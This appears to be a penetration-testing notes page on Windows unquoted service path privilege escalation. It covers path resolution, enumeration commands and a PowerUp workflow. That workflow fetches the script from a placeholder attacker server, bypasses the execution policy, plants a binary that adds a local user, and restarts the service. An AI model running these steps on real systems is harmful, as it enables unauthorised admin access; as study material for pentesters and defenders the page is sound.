---
description: This attack relies on windows find an executable path when it's Unquoted.
---

# Unquoted Service Paths

## Introduction

When the service starts the `CreateProcess` function execute, this function receives as a parameter   `lpApplicationName` which is used to specify the path of the binary file.\
If the provided path is unquoted and include space, Then the windows service will interpreted it in various ways.

For example the path **`C:\Program Files\program folder\binary.exe`** will used in the following order:&#x20;

```
C:\Program.exe
C:\Program Files\program.exe
C:\Program Files\program folder\binary.exe
```

## Enumeration

Searching for vulnerable services:

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```batch
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Checking permission to create files in execute paths:

```batch
icacls "<path>"
```

The table below describes the permissions definitions **`icacls`** results:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

## Exploit

The process is pretty similar to [service-binary-hijacking.md](service-binary-hijacking.md "mention")

1. [#creating-the-malicious-binary](service-binary-hijacking.md#creating-the-malicious-binary "mention")
2. [#triggering-the-execution](service-binary-hijacking.md#triggering-the-execution "mention")

## Automated Process

It is possible to automate the process using well known tool called `PowerUp` from `PowerSploit` Collection:

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

Downloading PowerUp.ps1:

```powershell
iwr -uri http://<attacker_http_server>/PowerUp.ps1 -Outfile PowerUp.ps1
```

Bypassing Execution Policy:

```batch
powershell -ep bypass
```

Importing PowerUp.ps1:

```powershell
. .\PowerUp.ps1
```

Enumerate services with unquoted paths:

```powershell
Get-UnquotedService
```

Exploiting by creating a malicious binary (the default behavior is to create a new local user called _john_ with the password _Password123!_)

```powershell
Write-ServiceBinary -Name '<service_name>' -Path "<binary_path>"
```

Triggering the exploit by restarting the service

```powershell
Restart-Service <service_name>
```

## References

{% embed url="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md" %}
UnquotedServicePath
{% endembed %}
